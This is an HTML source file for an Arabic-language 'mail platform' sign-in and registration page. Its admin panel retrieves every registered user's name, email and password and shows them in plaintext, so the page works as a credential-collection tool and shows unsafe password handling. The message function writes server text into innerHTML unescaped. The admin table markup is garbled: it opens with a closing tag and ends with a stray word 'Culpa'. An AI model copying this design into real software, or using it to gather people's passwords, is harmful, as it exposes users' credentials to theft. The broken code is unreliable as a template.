<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>منصة تسجيل الدخول</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(145deg, #0a1f2e, #07141f);
            font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            width: 100%;
            background: rgba(0,0,0,0.65);
            backdrop-filter: blur(12px);
            border-radius: 60px;
            padding: 30px 25px;
            border: 1px solid #ffcc88;
        }
        h1 { color: #ffdd99; text-align: center; margin-bottom: 5px; }
        .sub { text-align: center; color: #aaccee; margin-bottom: 25px; font-size: 0.8rem; }
        input, button {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border-radius: 60px;
            border: none;
            font-size: 1rem;
        }
        input { background: #1e2e3a; color: white; }
        button {
            background: #e94560;
            color: white;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
        }
        button:hover { background: #ff2e5a; transform: scale(1.02); }
        .switch { text-align: center; margin-top: 15px; color: #88aacc; }
        .switch a { color: #ffaa88; cursor: pointer; text-decoration: none; }
        .message { margin-top: 15px; text-align: center; font-size: 0.85rem; }
        .admin-btn { background: #2a6b9e; margin-top: 15px; }
        .admin-panel { margin-top: 25px; border-top: 1px solid #ffaa55; padding-top: 15px; display: none; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; background: #000000aa; border-radius: 20px; overflow: hidden; }
        th, td { padding: 8px; text-align: center; border-bottom: 1px solid #ffaa55; color: #eef4ff; }
        th { background: #e94560; }
        footer { text-align: center; margin-top: 20px; font-size: 0.7rem; color: #7e9ab5; }
        @media (max-width: 600px) {
            th, td { font-size: 0.7rem; }
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
</head>
<body>
<div class="container">
    <h1>🔐 منصة البريد</h1>
    <div class="sub">تسجيل الدخول أو إنشاء حساب</div>

    <div id="loginPanel">
        <input type="email" id="loginEmail" placeholder="البريد الإلكتروني">
        <input type="password" id="loginPassword" placeholder="كلمة المرور">
        <button id="doLogin">تسجيل الدخول</button>
        <div class="switch">ليس لديك حساب؟ <a id="showReg">إنشاء حساب جديد</a></div>
    </div>

    <div id="registerPanel" style="display:none;">
        <input type="text" id="regName" placeholder="الاسم الكامل">
        <input type="email" id="regEmail" placeholder="البريد الإلكتروني">
        <input type="password" id="regPassword" placeholder="كلمة المرور">
        <button id="doRegister">إنشاء حساب</button>
        <div class="switch">لديك حساب؟ <a id="showLogin">تسجيل الدخول</a></div>
    </div>

    <button id="showAdminBtn" class="admin-btn">👑 دخول المشرف</button>

    <div id="adminPanel" class="admin-panel">
        <h3 style="color:#ffdd99; text-align:center;">لوحة المشرفين</h3>
        <input type="password" id="adminKeyInput" placeholder="كلمة مرور المشرف">
        <button id="adminLoginBtn">عرض البيانات</button>
        <div id="adminData"></div>
        <button id="closeAdminBtn" style="background:#555;">إغلاق</button>
    </div>

    <div id="msg" class="message"></div>
    <footer>🔒 البيانات تُحفظ على الخادم. المشرف فقط يمكنه رؤيتها.</footer>
</div>

<script>
    const loginDiv = document.getElementById('loginPanel');
    const registerDiv = document.getElementById('registerPanel');
    const adminPanel = document.getElementById('adminPanel');
    const msgDiv = document.getElementById('msg');

    function showMessage(msg, isError = false) {
        msgDiv.innerHTML = `<span style="color:${isError ? '#ffaaaa' : '#aaffaa'}">${msg}</span>`;
        setTimeout(() => { if (msgDiv.innerHTML.includes(msg)) msgDiv.innerHTML = ''; }, 3000);
    }

    document.getElementById('showReg').onclick = () => {
        loginDiv.style.display = 'none';
        registerDiv.style.display = 'block';
        msgDiv.innerHTML = '';
    };
    document.getElementById('showLogin').onclick = () => {
        registerDiv.style.display = 'none';
        loginDiv.style.display = 'block';
        msgDiv.innerHTML = '';
    };

    document.getElementById('doLogin').onclick = async () => {
        const email = document.getElementById('loginEmail').value.trim();
        const password = document.getElementById('loginPassword').value.trim();
        if (!email || !password) { showMessage('يرجى إدخال البريد وكلمة المرور', true); return; }
        try {
            const res = await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, password })
            });
            const data = await res.json();
            if (res.ok) {
                showMessage(`✅ ${data.message}`);
            } else {
                showMessage(`❌ ${data.error}`, true);
            }
        } catch(e) { showMessage('خطأ في الاتصال', true); }
    };

    document.getElementById('doRegister').onclick = async () => {
        const name = document.getElementById('regName').value.trim();
        const email = document.getElementById('regEmail').value.trim();
        const password = document.getElementById('regPassword').value.trim();
        if (!name || !email || !password) { showMessage('جميع الحقول مطلوبة', true); return; }
        try {
            const res = await fetch('/api/register', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ name, email, password })
            });
            const data = await res.json();
            if (res.ok) {
                showMessage(`✅ ${data.message}`);
                registerDiv.style.display = 'none';
                loginDiv.style.display = 'block';
            } else {
                showMessage(`❌ ${data.error}`, true);
            }
        } catch(e) { showMessage('خطأ في الاتصال', true); }
    };

    // المشرف
    document.getElementById('showAdminBtn').onclick = () => {
        adminPanel.style.display = 'block';
    };
    document.getElementById('closeAdminBtn').onclick = () => {
        adminPanel.style.display = 'none';
        document.getElementById('adminData').innerHTML = '';
    };
    document.getElementById('adminLoginBtn').onclick = async () => {
        const adminKey = document.getElementById('adminKeyInput').value.trim();
        if (!adminKey) { showMessage('أدخل كلمة مرور المشرف', true); return; }
        try {
            const res = await fetch('/api/admin/users', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ adminKey })
            });
            const data = await res.json();
            if (!res.ok) {
                showMessage(`❌ ${data.error}`, true);
                return;
            }
            const users = data.users;
            if (users.length === 0) {
                document.getElementById('adminData').innerHTML = '<p style="text-align:center; padding:10px;">لا يوجد مستخدمون</p>';
                return;
            }
            let html = `</table><thead><tr><th>الاسم</th><th>البريد</th><th>كلمة المرور</th><th>التاريخ</th></tr></thead><tbody>`;
            users.forEach(u => {
                html += `<tr><td>${escapeHtml(u.name)}</td><td>${escapeHtml(u.email)}</td><td>${escapeHtml(u.password)}</td><td>${u.timestamp || 'قديم'}</td></tr>`;
            });
            html += `</tbody> Culpa`;
            document.getElementById('adminData').innerHTML = html;
        } catch(e) { showMessage('خطأ في الاتصال', true); }
    };

    function escapeHtml(str) {
        return str.replace(/[&<>]/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        });
    }
</script>
</body>
</html>
